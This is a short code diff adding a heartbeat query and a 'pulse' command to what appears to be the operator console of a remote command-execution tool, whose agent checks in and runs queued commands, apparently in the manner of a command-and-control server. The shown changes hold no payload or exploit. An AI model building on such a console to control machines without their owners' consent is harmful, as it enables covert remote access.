@@ -69,8 +69,11 @@ def get_last_result():
     return cur.fetchone()
 
 def not_implemented():
-    
     logger.failed("This function is currently unavailable but will probably be implemented in the future")
+
+def get_heartbeat():
+    cur.execute("SELECT beat FROM pulse ORDER BY id DESC LIMIT 1")
+    return cur.fetchone()[0]
 
 #############################################################################
 
@@ -90,6 +93,9 @@ try:
             continue
         if command in ["cd ..", "cd .", "cd"]:
             logger.failed("you cannot use dots in the command")
+            continue
+        if command in ["pulse", "heartbeat", "beat"]:
+            logger.info(f"Agent last checked in at {get_heartbeat()}")
             continue
 
         waiting_for_result = new_command(command)
